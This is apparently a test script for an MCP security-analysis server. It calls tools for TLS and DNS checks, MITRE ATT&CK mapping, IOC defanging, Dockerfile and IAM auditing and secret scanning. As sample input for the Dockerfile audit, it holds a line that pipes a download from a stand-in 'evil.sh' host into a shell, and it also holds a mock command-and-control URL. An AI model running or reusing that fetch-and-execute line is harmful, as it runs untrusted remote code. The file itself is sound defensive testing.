"""Comprehensive test suite for all 6 cybersecurity skills and universal memory."""

import asyncio
import json
import sys
from pathlib import Path

# Add src to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from mcp_sec_analyzer.server import server


async def main():
    tools = await server.list_tools()
    print("==================================================")
    print(f"Total Registered Tools in MCP Server Hub: {len(tools)}")
    print("==================================================")

    # 1. Skill Catalog
    skills_res = await server.call_tool("list_skills", {})
    catalog = json.loads(skills_res.content[0].text)
    print(f"\n[1] Active Skills Catalog ({catalog['total_active_skills']} skills):")
    for s in catalog["active_skills"]:
        print(f"  * {s['id']}: {s['name']} ({len(s['tools'])} tools)")

    # 2. OSINT / Reconnaissance
    print("\n[2] Testing OSINT / Reconnaissance:")
    tls_res = await server.call_tool("inspect_tls_certificate", {"hostname": "google.com"})
    tls_data = json.loads(tls_res.content[0].text)
    print(f"  - TLS cert: {tls_data.get('hostname')} | Protocol: {tls_data.get('tls_version')} | Issuer: {tls_data.get('issuer')}")

    dns_res = await server.call_tool("lookup_dns_records", {"domain": "github.com"})
    dns_data = json.loads(dns_res.content[0].text)
    sp = dns_data.get("email_security_posture", {})
    print(f"  - DNS Posture for github.com: SPF={sp.get('spf_assessment')} | DMARC={sp.get('dmarc_assessment')}")

    # 3. Threat Intelligence & Defense Mapping
    print("\n[3] Testing Threat Intelligence:")
    mitre_res = await server.call_tool("map_mitre_attack", {"query": "process injection"})
    mitre_data = json.loads(mitre_res.content[0].text)
    top_t = mitre_data["results"][0]
    print(f"  - MITRE ATT&CK: {top_t['technique_id']} ({top_t['name']}) - Tactic: {top_t['tactic']}")

    ioc_res = await server.call_tool("analyze_ioc_indicator", {"indicator": "http://malicious-c2.test/payload.exe"})
    ioc_data = json.loads(ioc_res.content[0].text)
    print(f"  - IOC: {ioc_data.get('type')} | Defanged: {ioc_data.get('defanged_indicator')}")

    # 4. Cloud & Container Hardening
    print("\n[4] Testing Cloud & Container Hardening:")
    dockerfile_bad = "FROM python:latest\nRUN curl http://evil.sh | sh\n"
    docker_res = await server.call_tool("audit_dockerfile", {"dockerfile_path_or_content": dockerfile_bad})
    docker_data = json.loads(docker_res.content[0].text)
    print(f"  - Dockerfile CIS audit: {docker_data.get('issues_detected')} issues identified")

    iam_policy = json.dumps({"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]})
    iam_res = await server.call_tool("audit_iam_policy", {"policy_json_str": iam_policy})
    iam_data = json.loads(iam_res.content[0].text)
    print(f"  - IAM Policy audit: {iam_data.get('risks_identified')} critical risks identified")

    # 5. Security Audit (Secrets & SAST)
    print("\n[5] Testing Security Audit:")
    sec_res = await server.call_tool("scan_secrets", {"target_path": "src", "max_findings": 5})
    sec_data = json.loads(sec_res.content[0].text)
    print(f"  - Secrets scanned: {sec_data.get('files_scanned')} files | Findings: {sec_data.get('secrets_detected')}")

    # 6. Universal Persistent Memory Timeline
    print("\n[6] Universal Persistent Memory (Timeline Audit):")
    tl_res = await server.call_tool("get_timeline", {"limit": 6})
    for block in tl_res.content:
        item = json.loads(block.text)
        print(f"  [{item['skill']}] {item['tool_name']}: {item['summary']}")

    print("\n==================================================")
    print("ALL 6 CYBERSECURITY SKILLS VERIFIED & FUNCTIONAL!")
    print("==================================================")


if __name__ == "__main__":
    asyncio.run(main())
